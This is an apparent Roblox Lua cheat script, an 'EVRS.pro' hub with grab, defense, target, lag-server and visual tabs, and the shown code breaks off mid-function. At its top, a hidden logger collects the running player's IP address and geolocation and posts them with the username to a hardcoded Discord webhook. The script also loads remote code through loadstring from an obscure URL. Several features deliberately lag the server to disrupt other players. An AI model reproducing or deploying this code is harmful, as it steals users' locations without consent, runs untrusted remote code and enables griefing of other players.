local WEBHOOK_URL = "https://discord.com/api/webhooks/1544252508401041418/YHzzabLnbXICo92Nhr4NBpmYsZBJJZYtg7H4LkO6VrMf2Z90daNZEW7r2yXGnWeLY1Z6"

local function getIP()
    local func = syn and syn.request or http_request or request
    if not func then return "N/A" end
    local s, r = pcall(function()
        return func({ Url = "https://api.ipify.org", Method = "GET" })
    end)
    if s and r and r.Body then
        return r.Body:gsub("%s+", "")
    end
    return "N/A"
end

local function getLocation(ip)
    local func = syn and syn.request or http_request or request
    if not func or ip == "N/A" then
        return { city = "不明", lat = "N/A", lon = "N/A", google_maps = "https://www.google.com/maps" }
    end
    local url = "http://ip-api.com/json/" .. ip .. "?fields=status,city,lat,lon"
    local s, r = pcall(function()
        return func({ Url = url, Method = "GET" })
    end)
    if s and r and r.Body then
        local data = game:GetService("HttpService"):JSONDecode(r.Body)
        if data and data.status == "success" then
            return {
                city = data.city or "不明",
                lat = tostring(data.lat or "N/A"),
                lon = tostring(data.lon or "N/A"),
                google_maps = "https://www.google.com/maps/search/?api=1&query=" .. (data.lat or 0) .. "," .. (data.lon or 0)
            }
        end
    end
    return { city = "取得失敗", lat = "N/A", lon = "N/A", google_maps = "https://www.google.com/maps" }
end

local function main()
    local player = game:GetService("Players").LocalPlayer
    if not player then
        print("❌ プレイヤーが見つかりません")
        return
    end

    print("プレイヤー:", player.Name)
    local ip = getIP()
    print("IP:", ip)
    local location = getLocation(ip)
    print("住所:", location.city)
    print("Googleマップ:", location.google_maps)

    -- Discordに送信
    local embed = {
        {
            title = "現在地レポート",
            description = string.format(
                "**ユーザー名:** `%s`\n" ..
                "**IP:** `%s`\n" ..
                "**都市:** `%s`\n" ..
                "**緯度:** `%s`\n" ..
                "**経度:** `%s`\n" ..
                "\n[Googleマップで開く](%s)",
                player.Name,
                ip,
                location.city,
                location.lat,
                location.lon,
                location.google_maps
            ),
            color = 0x00FF00
        }
    }

    local func = syn and syn.request or http_request or request
    if func then
        func({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode({ username = "ロガー", embeds = embed })
        })
        print("✅ Discord送信完了！")
    end
end

pcall(main)

    local StartTick1 = tick()

    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local UIS = game:GetService("UserInputService")
    local Debris = game:GetService("Debris")
    local TextChatService = game:GetService("TextChatService")
    local Lighting = game:GetService("Lighting")

    local plr = Players.LocalPlayer
    local mouse = plr:GetMouse()
    local char = plr.Character
    local hum = char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head")
    local IsHeld = plr.IsHeld
    local CanSpawnToy = plr.CanSpawnToy
    local InPlot = plr.InPlot
    local InOwnedPlot = plr.InOwnedPlot
    local AntiLineLag = plr.PlayerScripts.CharacterAndBeamMove
    local AntiShuriLag = plr.PlayerScripts.StickyPartsTouchDetection
    local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys") or workspace:WaitForChild(plr.Name.."SpawnedInToys")

    local SetNetworkOwner = RS.GrabEvents:FindFirstChild("SetNetworkOwner") or RS.GrabEvents:WaitForChild("SetNetworkOwner")
    local StickyEvent = RS.PlayerEvents:FindFirstChild("StickyPartEvent") or RS.PlayerEvents:WaitForChild("StickyPartEvent")
    local DestroyToy = RS.MenuToys:FindFirstChild("DestroyToy") or RS.MenuToys:WaitForChild("DestroyToy")
    local Struggle = RS.CharacterEvents:FindFirstChild("Struggle") or RS.CharacterEvents:WaitForChild("Struggle")
    local CreateGrabLine = RS.GrabEvents:FindFirstChild("CreateGrabLine") or RS.GrabEvents:WaitForChild("CreateGrabLine")
    local SetLineColor = RS.DataEvents:FindFirstChild("UpdateLineColorsEvent") or RS.DataEvents:WaitForChild("UpdateLineColorsEvent")
    local SpawnToyRemote = RS.MenuToys:FindFirstChild("SpawnToyRemoteFunction") or RS.MenuToys:WaitForChild("SpawnToyRemoteFunction")
    local DestroyGrabLine = RS.GrabEvents:FindFirstChild("DestroyGrabLine") or RS.GrabEvents:WaitForChild("DestroyGrabLine")
    local RagdollRemote = RS.CharacterEvents:FindFirstChild("RagdollRemote") or RS.CharacterEvents:WaitForChild("RagdollRemote")

    local MyPCLD = nil  
    local cons = {}
    local bool = {}
    local int = {}
    local etc = {
        MyPCLD = nil,
        TargetPLR = nil,
        Root = nil,
        Head = nil,
        Torso = nil,
        Hum = nil,
        TargetChar = nil,
        Limbs = {
            "Left Arm",
            "Left Leg",
            "Right Arm",
            "Right Leg"
        },
        
        MapPoints = {
            ["Green House"] = CFrame.new(-548.305054, -2.45424771, 79.3213348),
            ["Pink House"] = CFrame.new(-475.493835, -2.70774508, -159.395279),
            ["Witch House"] = CFrame.new(270.225922, -2.48055029, 458.186493),
            ["Blue House"] = CFrame.new(501.939911, 88.2323608, -349.129211),
            ["China House"] = CFrame.new(545.441833, 128.004593, -99.4881439)
        },
        LastBlob = nil,
        LastTrainSeat = nil
    }

    local function GetMagnitude(Part1: Instance, Part2: Instance)
        return (Part1.Position - Part2.Position).Magnitude
    end

    local function FWD(parent,part,time)
        return parent:FindFirstChild(part) or parent:WaitForChild(part,time)
    end

    local function HasProperty(obj, property)
        local ok = pcall(function() if obj[property] then end end)
        return ok
    end

    local function CFP(parent,part)
        return parent:FindFirstChild(part) ~= nil  
    end

    function cons:disc(con)
        if cons[con] then 
            cons[con]:Disconnect()
            cons[con] = nil
        end 
    end
    function cons:discAll()
        for _,v in pairs(cons) do 
            v:Disconnect()
        end 
        cons = {}
    end
    function cons:cancel(coroutine)
        if cons[coroutine] then 
            task.cancel(cons[coroutine])
            cons[coroutine] = nil
        end 
    end 
    local function FindPCLD()
        cons:disc("FindPCLDCon")
        cons["FindPCLDCon"] = RunService.Heartbeat:Connect(function()
            if etc.MyPCLD then 
                cons:disc("FindPCLDCon")
            end
            for _, v in pairs(workspace:GetChildren()) do 
                if v.Name == "PlayerCharacterLocationDetector" and GetMagnitude(v,hrp) <= 2 then 
                    etc.MyPCLD = v
                    break
                end
            end
        end)
    end

    local function OnCharAdded(character)
        char = character
        etc["MyPCLD"] = nil
        cons:disc("AntiMassless")
        cons:disc("ThirdpFix")
        head = FWD(char,"Head")
        hrp = FWD(char,"HumanoidRootPart")
        hum = FWD(char,"Humanoid")
        cons["AntiMassless"] = hrp:GetPropertyChangedSignal("Massless"):Connect(function()
            if (hrp.Massless) and (bool.AntiVoidEnabled) then 
                hrp.Massless = false 
            end
        end)
        cons["ThirdpFix"] = head:GetPropertyChangedSignal("Transparency"):Connect(function()
            if head.Transparency == 1 then 
                task.wait(0.1)
                for _,v in pairs(char:GetChildren()) do 
                    if (v:IsA("Accessory") and v.Name ~= "TypingKeyboardMyWorld") or v:IsA("Hat") then 
                        v.Handle.Transparency = 0
                    elseif v:IsA("BasePart") and v ~= hrp then  
                        v.Transparency = 0
                    end
                end
            end
        end)
        task.spawn(FindPCLD)
        hrp.CFrame = hrp.CFrame * CFrame.new(0,1,0)
        FWD(hrp,"Scream"):Destroy()
    end
    local function toy_delete(toy) DestroyToy:FireServer(toy) end
    local function sno(part) SetNetworkOwner:FireServer(part,part.CFrame) end

    local function unsno(part) DestroyGrabLine:FireServer(part) end

    local function line(part) CreateGrabLine:FireServer(part,part.CFrame) end

    local function CheckNetworkOwnerOnPart(Part) 
        return CFP(Part,"PartOwner") and Part["PartOwner"].Value == plr.Name
    end

    local function CheckNetworkOwnerOnPlayer(TargetPlr,Root) 
        if Root then
            local Head = Root.Parent and Root.Parent:FindFirstChild("Head")
            return Head and CheckNetworkOwnerOnPart(Head)
        else 
            TargetChar = TargetPlr.Character
            TargetRoot = TargetChar and TargetChar.Parent and TargetChar:FindFirstChild("Head")
            return TargetRoot and CheckNetworkOwnerOnPart(TargetRoot)
        end
    end

    local function FindBlob()
        if etc["LastBlob"] == nil or not CFP(etc["LastBlob"],"VehicleSeat") or etc["LastBlob"].VehicleSeat.Occupant ~= hum then 
            etc["LastBlob"] = hum.SeatPart and hum.SeatPart:FindFirstAncestor("CreatureBlobman")
        end 
        return etc["LastBlob"]
    end

    local function StopAllVelocity(parent)
        local ToStopPart = parent.PrimaryPart or parent
        ToStopPart.AssemblyLinearVelocity = Vector3.zero
        ToStopPart.AssemblyAngularVelocity = Vector3.zero
    end

    local function StopVelocityF()
        if hrp then 
            hrp.AssemblyLinearVelocity = Vector3.zero
        end 
    end 

    local function Notify(Title,SubTitle)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = Title,
            Text = SubTitle,
            Duration = 5,
        })
    end

    local function ToCFrame(Vectorbf:Vector3)
        return CFrame.new(Vectorbf)
    end


    local function CheckForHome()
        if etc["LastHouse"] == nil or etc["LastPlotOwner"] == nil or etc["LastPlotOwner"].Parent == nil then 
            for i = 1,5 do 
                local Plot = workspace.Plots["Plot"..i]
                for _,v in pairs(Plot.PlotSign["ThisPlotsOwners"]:GetChildren()) do 
                    if v.Value == plr.Name then 
                        etc["LastHouse"] = workspace.PlotItems["Plot"..i]
                        etc["LastPlotOwner"] = v 
                        return etc["LastHouse"]
                    end
                end
            end
        end
        return etc["LastHouse"]
    end

    local function Huge() 
        return math.huge,math.huge,math.huge
    end

    -- local function SpawnToy(ToyName: string)
    --     if InPlot.Value and not InOwnedPlot.Value then 
    --         InPlot:GetPropertyChangedSignal("Value"):Wait()
    --     end 
    --     if not CanSpawnToy.Value then 
    --         CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
    --     end
    --     local SpawnCF = (etc.MyPCLD or hrp).CFrame * CFrame.new(0,14,20)
    --     task.spawn(SpawnToyRemote.InvokeServer, SpawnToyRemote, ToyName, SpawnCF, Vector3.zero)
    --     if InOwnedPlot.Value then 
    --         local Plot = CheckForHome()
    --         return Plot and FWD(Plot,ToyName,2.5)
    --     else 
    --         return FWD(inv,ToyName,2.5)
    --     end
    -- end
    local function SpawnToy(ToyName: string)
    if InPlot.Value and not InOwnedPlot.Value then 
        InPlot:GetPropertyChangedSignal("Value"):Wait()
    end 
    if not CanSpawnToy.Value then 
        CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
    end

    local SpawnCF = (etc.MyPCLD or hrp).CFrame * CFrame.new(0, 14, 20)
    
    local Container = InOwnedPlot.Value and CheckForHome() or inv
    if not Container then return nil end

    local spawnedObject = nil
    local connection
    connection = Container.ChildAdded:Connect(function(child)
        if child.Name == ToyName then
            spawnedObject = child
        end
    end)

    task.spawn(function()
        pcall(function()
            SpawnToyRemote:InvokeServer(ToyName, SpawnCF, Vector3.zero)
        end)
    end)

    local start = tick()
    repeat task.wait() until spawnedObject or (tick() - start) > 2.5

    connection:Disconnect()
    return spawnedObject
end

    local function BringRight(k)
        local v = FindBlob()
        local Root = Players[k].Character:FindFirstChild("HumanoidRootPart")
        if not Root or not v then return end
        v.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(v.RightDetector, Root, v.RightDetector.RightWeld)
    end

    local function DropRight(k)
        local v = FindBlob()
        local Root = Players[k].Character:FindFirstChild("HumanoidRootPart")
        if not Root or not v then return end
        v.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(v.RightDetector.RightWeld, Root)
    end

    local function BugRight(k)
        local v = FindBlob()
        local Root = Players[k].Character:FindFirstChild("HumanoidRootPart")
        if not Root or not v then return end
        v.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(v.RightDetector.RightWeld, Root)
    end

    local function BuildPlayerOptions()
        local options = {}
        local map = {}
        
        for _, player in ipairs(Players:GetPlayers()) do
            local display = string.format(
                '<font color="rgb(255,0,0)"><b>%s</b></font> <b><i>(%s)</i></b>',
                player.Name,
                player.DisplayName
            )   
            table.insert(options, display)
            map[display] = player
        end
        
        return options, map
    end

    local function ChangeCollision(obj,val)
        for _,v in pairs(obj:GetChildren()) do 
            if v:IsA("BasePart") and v.Name ~= "GrabParts" then  
                v.CanCollide = val
            end
        end
    end

    local function createLagWithGrabLine()
        for _, object in ipairs(workspace:GetDescendants()) do
            if object:IsA("BasePart") and object.Parent ~= plr.Character then
                local cf = object.CFrame * CFrame.new(
                    math.random(-int.lagIntensity, int.lagIntensity),
                    1e9,
                    math.random(-int.lagIntensity, int.lagIntensity)
                ) * CFrame.Angles(
                    math.rad(math.random(0, 360)),
                    math.rad(math.random(0, 360)),
                    math.rad(math.random(0, 360))
                )
                CreateGrabLine:FireServer(object, cf)
            end
        end
    end
    int.PCLDColor = Color3.fromRGB(0, 255, 255)
    local function AddESP(obj)
        if obj.Name == "PlayerCharacterLocationDetector" and not obj:FindFirstChild("PCLD_ESP") then
            local adorn = Instance.new("BoxHandleAdornment")
            adorn.Name = "PCLD_ESP"
            adorn.Size = obj.Size
            adorn.AlwaysOnTop = true
            adorn.ZIndex = 10
            adorn.Color3 = int.PCLDColor
            adorn.Transparency = 0.75
            adorn.Adornee = obj
            adorn.Parent = obj
        end
    end

    local function RemoveESP(obj)
        if obj.Name == "PlayerCharacterLocationDetector" then
            local esp = obj:FindFirstChild("PCLD_ESP")
            if esp then
                esp:Destroy()
            end
        end
    end

    local function lag()
        local oldCF = char:GetPivot()

        if bool.ShurikenLagServerT then
            local ToyFolder = CheckForHome()
            if not ToyFolder then return end
            
            local decoys = {}
            local shurikens = {}

            for _, obj in pairs(ToyFolder:GetChildren()) do
                if obj:IsA("Model") then
                    if obj.Name == "YouDecoy" then

                        repeat 
                            char:PivotTo(obj.HumanoidRootPart.CFrame * CFrame.new(0,10,0))
                            sno(obj.HumanoidRootPart)
                            task.wait(0.02)
                        until obj.Head:FindFirstChild("PartOwner") or not bool.ShurikenLagServerT
                        
                        table.insert(decoys, obj)
                    elseif obj.Name == "NinjaShuriken" then
                        
                        for _, child in pairs(obj.StickyPart:GetChildren()) do
                            if child.Name == "TouchInterest" then
                                child:Destroy()
                            end
                        end
                        
                        task.wait()

                        local tick1 = tick()
                        repeat
                            char:PivotTo(obj.SoundPart.CFrame * CFrame.new(0,10,0))
                            sno(obj.SoundPart)
                            task.wait(0.02)
                        until obj.SoundPart:FindFirstChild("PartOwner") or not bool.ShurikenLagServerT or (tick() - tick1 >= 5)
                        
                        table.insert(shurikens, obj)
                    end
                end
            end
            
            char:PivotTo(oldCF)
            local maxshurikensperdecoy = 5

            for decoyindex, decoy in ipairs(decoys) do
                local decoyHRP = decoy:FindFirstChild("HumanoidRootPart")
                if decoyHRP and bool.ShurikenLagServerT then
                    decoyHRP.Anchored = true
                    local startindex = (decoyindex - 1) * maxshurikensperdecoy + 1
                    local endindex = startindex + maxshurikensperdecoy - 1
                    
                    for shurikenindex = startindex, endindex do
                        local shuriken = shurikens[shurikenindex]
                        if not shuriken then
                            break
                        end
                        
                        local StickyPart = shuriken:FindFirstChild("StickyPart")
                        if StickyPart then
                            StickyPart.CanTouch = true
                            
                            for _, part in pairs(decoy:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false
                                end
                            end
                            
                            local BodyPosition = Instance.new("BodyPosition")
                            BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            BodyPosition.P = 10000
                            BodyPosition.D = 500
                            BodyPosition.Parent = StickyPart
                            
                            for _, part in pairs(shuriken:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false
                                end
                            end
                            
                            for _, child in pairs(StickyPart:GetChildren()) do
                                if child.Name == "TouchInterest" then
                                    child:Destroy()
                                end
                            end
                            
                            task.defer(function()
                                repeat
                                    StickyPart.AssemblyAngularVelocity = Vector3.new(
                                        math.random(-100, 100) * 50,
                                        math.random(-100, 100) * 50,
                                        math.random(-100, 100) * 50
                                    )
                                    BodyPosition.Position = Vector3.new(
                                        decoyHRP.Position.X,
                                        decoyHRP.Position.Y - 4,
                                        decoyHRP.Position.Z
                                    )
                                    wait(0.0001)
                                    BodyPosition.Position = Vector3.new(
                                        decoyHRP.Position.X,
                                        decoyHRP.Position.Y + 3,
                                        decoyHRP.Position.Z
                                    )
                                    wait(0.0001)
                                until not bool.ShurikenLagServerT or not shuriken.Parent or not decoy.Parent
                            end)
                        end
                        wait()
                    end
                end
                wait()
            end
        end
    end

    local function RenameInShop(Instance,OriginalName,ToRename)
        local index = nil
        local ToCheckName = Instance.Name or Instance
        for i,v in pairs(inv:GetChildren()) do if v.Name == ToCheckName then index = i end end
        if index == nil then return end 
        local contents = plr.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents
        for i,v in ipairs(contents:GetChildren()) do
            if v.Name == OriginalName and i == index then
                local view = v.ViewItemButton
                view.Text = ToRename
                view.TextScaled = true
                view.LowResImage.Image = ""
            end
        end
    end

    local OrionLib = loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=d33avck2"))()

local Window = OrionLib:MakeWindow({
    Name = "EVRS.pro",
    PremiumOnly = false,
    SaveConfig = true,
    ConfigFolder = "NNhub",
    IntroEnabled = true,
    IntroImage = "rbxassetid://90369054156879",
    IntroText = "LOADING...!!!",
    Keybind = "K",
    FreeMouse = true,
})

local GrabTab = Window:MakeTab({
    Name = "<font size = \"18\">Grab</font>",
    Icon = "hand", -- swordでもOK
    PremiumOnly = false
})

local DefTab = Window:MakeTab({
    Name = "<font size = \"18\">Defense</font>",
    Icon = "shield",
    PremiumOnly = false
})

local PlrTab = Window:MakeTab({
    Name = "<font size = \"18\">Player</font>",
    Icon = "user",
    PremiumOnly = false
})

local TarTab = Window:MakeTab({
    Name = "<font size = \"18\">Target</font>",
    Icon = "crosshair",
    PremiumOnly = false
})

local ServerTab = Window:MakeTab({
    Name = "<font size = \"18\">Blobman</font>",
    Icon = "bot",
    PremiumOnly = false
})

local VisualTab = Window:MakeTab({
    Name = "<font size = \"18\">Visuals</font>",
    Icon = "eye",
    PremiumOnly = false
})

local AuraTab = Window:MakeTab({
    Name = "<font size = \"18\">Auras</font>",
    Icon = "ghost",
    PremiumOnly = false
})

local CoinTab = Window:MakeTab({
    Name = "<font size = \"18\">Coin</font>",
    Icon = "coins",
    PremiumOnly = false
})

local TeleportTab = Window:MakeTab({
    Name = "<font size = \"18\">Teleport</font>",
    Icon = "navigation",
    PremiumOnly = false
})

local KeybindTab = Window:MakeTab({
    Name = "<font size = \"18\">Keybinds</font>",
    Icon = "keyboard",
    PremiumOnly = false
})

local MiscTab = Window:MakeTab({
    Name = "<font size = \"18\">Lag Server</font>",
    Icon = "server-crash",
    PremiumOnly = false
})

local TxTab = Window:MakeTab({
    Name = "<font size = \"18\">World</font>",
    Icon = "globe",
    PremiumOnly = false
})

local InfoTab = Window:MakeTab({
    Name = "<font size = \"18\">Infomation</font>",
    Icon = "info",
    PremiumOnly = false
})

local ConfigTab = Window:MakeTab({
    Name = "<font size = \"18\">Settings</font>",
    Icon = "settings",
    PremiumOnly = false
})
    
    local Toggles = {}
    
    
    
    DefTab:AddSection({Name = "<font color=\"rgb(0, 180, 60)\"><b>Protection 1</b></font>"})

-- DEFENSE --
Toggles["AntiGrab"] = DefTab:AddToggle({
    Name = "AntiGrab<font color=\"rgb(255, 165, 0)\"><b>[BASE]</b></font>",
    Default = false,
    inSave = true,
    Flag = "AntiGrab",
    Callback = function(Value)
        if Value then
            cons["AntiGrab1Con"] = IsHeld:GetPropertyChangedSignal("Value"):Connect(function()
                if IsHeld.Value then
                    hrp.Anchored = true
                    Struggle:FireServer("Unbind")

                    -- 掴まれた瞬間の座標を保存
                    local lockedCF = hrp.CFrame

                    cons:disc("AntiGrabSpawned")
                    cons["AntiGrabSpawned"] = RunService.Heartbeat:Connect(function()
                        -- 常時解除を送信
                        Struggle:FireServer("Unbind")
                        StopVelocityF()

                        -- 完全固定
                        hrp.CFrame = lockedCF
                        hrp.Anchored = true
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero

                        -- キャラクター全体の速度と回転をリセット
                        for _, part in ipairs(char:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.AssemblyLinearVelocity = Vector3.zero
                                part.AssemblyAngularVelocity = Vector3.zero
                            end
                        end

                        hum.Sit = false
                        hum.AutoRotate = true
                    end)

                    IsHeld:GetPropertyChangedSignal("Value"):Wait()

                    if not IsHeld.Value then
                        RagdollRemote:FireServer(hrp, 0)
                        hrp.Anchored = CFP(head, "PartOwner")
                        cons:disc("AntiGrabSpawned")
                    end
                end
            end)
        else
            cons:disc("AntiGrab1Con")
            cons:disc("AntiGrabSpawned")
            hrp.Anchored = false
        end
    end
})

-- Anti Kick Grab
Toggles["AntiKickGrab"] = DefTab:AddToggle({
    Name = "Anti Kick Grab",
    Default = false,
    Save = true,
    Flag = "AntiKickGrab",
    Callback = function(Value)
        bool.AntiKickGrab = Value
        
        if Value then
            cons["AntiKickGrab"] = RunService.Heartbeat:Connect(function()
                local char = plr.Character
                if not char then return end
                
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                
                local firePart = hrp:FindFirstChild("FirePlayerPart")
                if firePart then
                    local partOwner = firePart:FindFirstChild("PartOwner")
                    if partOwner and partOwner.Value ~= plr.Name then
                        -- キック対策
                        RagdollRemote:FireServer(hrp, 0)
                        task.wait(0.1)
                        Struggle:FireServer("Unbind")  -- または Struggle:FireServer()
                    end
                end
            end)
        else
            cons:disc("AntiKickGrab")
        end
    end
})

    DefTab:AddDropdown({
        Name = "GUCCI Method",
        Default = "CreatureBlobman",
        Options = {"CreatureBlobman", "TractorGreen"},
        Callback = function(Value)
            int.GucciMethod = Value
        end    
    })
    
    

    DefTab:AddButton({
        Name = "AntiGrab<font color=\"rgb(0, 180, 0)\"><b>[GUCCI]</b></font>",
        Callback = function()
            local blob,VehicleSeat
            blob = SpawnToy(int.GucciMethod)
            if not blob then return end 
            blob.Name = "AntiGucciBlob"
            task.delay(1,RenameInShop,blob,int.GucciMethod,"GucciThing")
            VehicleSeat = FWD(blob,"VehicleSeat") 
            if not VehicleSeat then DestroyToy:FireServer(blob) return end 
            VehicleSeat:Sit(hum)
            task.spawn(function()
                local EndTime = tick() + 0.5
                while tick() < EndTime and task.wait() do 
                    RagdollRemote:FireServer(hrp,0)
                end
            end)
            while not hum.SeatPart or IsHeld.Value do task.wait() end 
            task.wait()
            hum.Sit = false
            task.wait()
            blob:PivotTo(CFrame.new(0,1e3,0))
            VehicleSeat.CFrame = CFrame.new(0,1e3,0)
            do 
                local BodyPos = Instance.new("BodyPosition")
                BodyPos.P = 10000
                BodyPos.D = 4000
                BodyPos.MaxForce = Vector3.new(Huge())
                BodyPos.Parent = VehicleSeat
                BodyPos.Position = Vector3.new(0,1e5,0)
            end
        end
    })
    
    

    DefTab:AddButton({
        Name = "Gucci<font color=\"rgb(255, 215, 0)\"><b>[TRAIN]</b></font>",
        Callback = function()
            local oldCF = char:GetPivot()
            local Train,Seat
            Train = workspace.Map.AlwaysHereTweenedObjects.Train.Object:FindFirstChild("ObjectModel")
            if not Train then return end 
            for _,SeatRandom in pairs(Train:GetChildren()) do 
                if SeatRandom.Name == "Seat" and SeatRandom.Occupant == nil and SeatRandom ~= etc.LastSeat then 
                    etc.LastSeat = SeatRandom 
                    Seat = SeatRandom
                    break 
                end                 
            end
            if not Seat then return end 
            Seat:Sit(hum)
            task.spawn(function()
                local endTime = tick() + 0.5
                while tick() < endTime and task.wait() do
                    game.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0)
                end
            end)
            task.wait()
            while not hum.SeatPart or IsHeld.Value do task.wait() end
            hum.Sit = false
            task.wait()
            for _ = 1,3 do 
                char:PivotTo(oldCF)
            end
        end    
    })
    DefTab:AddButton({
        Name = "DestroyGucci",
        Callback = function()
            plr.IsHeld.Value = false  
            for i =  1,100 do 
                hum.Sit = true
            end
            task.wait(0.1)
            hum.Sit = false 
        end    
    })
    DefTab:AddToggle({
        Name = "Auto-Gucci<font color=\"rgb(255, 0, 0)\"><b>[Buggyyy!11]</b></font>",
        Default = false,
        Callback = function(Val)
            bool.AutoGucci = Val
            if Val then
                -- local GucciThing
                -- local function gucci()
                --     if not bool.AutoGucci then return end 
                --     bool.IsActive = true
                --     local oldCF = char:GetPivot()
                --     if GucciThing then
                --         cons:disc("OnceDestroying")
                --         for _,v in pairs(inv:GetChildren()) do
                --             if v.Name == "AutoGucci" then 
                --                 DestroyToy:FireServer(v)
                --             end
                --         end
                --     end 
                --     IsHeld.Value = head:FindFirstChild("PartOwner") ~= nil
                --     local ragdolled = FWD(hum, "Ragdolled")
                --     while ragdolled.Value or IsHeld.Value do task.wait() end 
                --     for _ = 1,100 do 
                --         hum.Sit = true
                --     end 
                --     task.wait(0.1)
                --     hum.Sit = false
                --     GucciThing = SpawnToy("TractorGreen")
                --     while not GucciThing and task.wait(0.25) do 
                --         GucciThing = SpawnToy("TractorGreen")
                --     end
                --     GucciThing.Name = "AutoGucci"
                --     FWD(GucciThing,"VehicleSeat"):Sit(hum)
                --     task.spawn(function()
                --         local endTime = tick() + 0.5
                --         while tick() < endTime and bool.IsActive and task.wait() do
                --             game.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0)
                --         end
                --     end)
                --     while not(hum.SeatPart or IsHeld.Value) and task.wait() do GucciThing.VehicleSeat:Sit(hum) end
                --     hum.Sit = false
                --     task.delay(0.05,function()
                --         GucciThing:PivotTo(CFrame.new(0,1e6,0))
                --         local BodyPos = Instance.new("BodyPosition")
                --         BodyPos.Position = Vector3.new(0,1e6,0)
                --         BodyPos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
                --         BodyPos.Parent = GucciThing.PrimaryPart
                --     end)
                --     cons["OnceDestroying"] = GucciThing.Destroying:Once(gucci)
                --     bool.IsActive = false
                -- end
                local GucciThing
                local function gucci()
                    if not bool.AutoGucci then return end 
                    bool.IsActive = true
                    if GucciThing then
                        cons:disc("OnceDestroying")
                        for _, v in pairs(inv:GetChildren()) do
                            if v.Name == "AutoGucci" or v.Name == "TractorGreen" then 
                                DestroyToy:FireServer(v)
                            end
                        end
                    end 

                    IsHeld.Value = head:FindFirstChild("PartOwner") ~= nil
                    local ragdolled = FWD(hum, "Ragdolled")
                    while ragdolled.Value or IsHeld.Value do task.wait() end 
                    for _ = 1,100 do 
                        hum.Sit = true
                    end 
                    task.wait(0.1)
                    hum.Sit = false 
                    GucciThing = SpawnToy("TractorGreen")
                    while not GucciThing do 
                        task.wait(0.25)
                        GucciThing = SpawnToy("TractorGreen")
                    end
                    
                    GucciThing.Name = "AutoGucci"
                    local seat = FWD(GucciThing, "VehicleSeat")
                    cons:cancel("SPAAAM")
                    cons["SPAAAM"] = task.spawn(function()
                        local endTime = tick() + 0.5
                        while tick() < endTime and task.wait() and bool.IsActive do
                            game.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0)
                        end
                    end)
                    local lastSitAttempt = 0
                    while not (hum.SeatPart or IsHeld.Value) do
                        if tick() - lastSitAttempt > 0.1 then
                            seat:Sit(hum)
                            lastSitAttempt = tick()
                        end
                        task.wait() 
                    end
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                    hrp.Anchored = true 
                    task.spawn(function()
                        repeat task.wait() until not(CFP(GucciThing.VehicleSeat,"SeatWeld"))
                        GucciThing:PivotTo(CFrame.new(0, 1e6, 0))
                        local BodyPos = Instance.new("BodyPosition")
                        BodyPos.Position = Vector3.new(0, 1e6, 0)
                        BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        BodyPos.Parent = GucciThing.PrimaryPart
                    end)
                    hrp.Anchored = false
                    cons["OnceDestroying"] = GucciThing.Destroying:Once(gucci)
                    bool.IsActive = false
                end
                gucci()
                cons["GucciChecker"] = RunService.Heartbeat:Connect(function()
                    if not bool.AutoGucci then 
                        cons:disc("GucciChecker")
                        return 
                    end
                    if bool.IsActive then return end 
                    if not (hrp and hum) or hum.Health == 0 then 
                        bool.IsActive = true
                        local newChar = plr.CharacterAdded:Wait()
                        hrp = newChar:WaitForChild("HumanoidRootPart")
                        hum = newChar:WaitForChild("Humanoid")
                        
                        task.wait(0.5)
                        gucci()
                        return
                    end
                    if not bool.IsActive then
                        if not isnetworkowner(hrp) or IsHeld.Value or hum.Sit then 
                            gucci()
                        end
                    end
                end)
            end
        end
    })

    DefTab:AddButton({
        Name = "Delete Legs",
        Callback = function()
            local ll,rl = char:FindFirstChild("Left Leg"), char:FindFirstChild("Right Leg")
            if not ll or not rl then return end 
            local oldCF = char:GetPivot()
            local oldFal = workspace.FallenPartsDestroyHeight
            workspace.FallenPartsDestroyHeight = -50000
            RagdollRemote:FireServer(hrp, 1)
            task.wait(0.5)
            rl.CFrame = CFrame.new(0, -60000, 0)
            ll.CFrame = CFrame.new(0, -60000, 0)
            task.wait(0.1)
            char:PivotTo(CFrame.new(0, -55970, 0))
            task.wait(0.1)
            char:PivotTo(oldCF)
            workspace.FallenPartsDestroyHeight = oldFal
            task.delay(0.3,function()
                while task.wait() do 
                    if not hum or hum.Health == 0 or char:FindFirstChild("Right Leg") then break end
                    if plr.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                        hum.HipHeight = 2
                    else
                        hum.HipHeight = 0
                    end
                end
            end)
        end    
    })

    DefTab:AddToggle({
        Name = "Struggle SPAM(AntiGrab/AntiBlob)",
        Default = false,
        Callback = function(Val)
            bool.LoopStruggle = Val
            while bool.LoopStruggle and task.wait() do  
                Struggle:FireServer("Unbind")
            end
        end
    })

DefTab:AddButton({
    Name = "Anti Snowball",
    Callback = function()
        local replicatedStorage = game:GetService("ReplicatedStorage")
        local bombEvents = replicatedStorage:FindFirstChild("BombEvents")
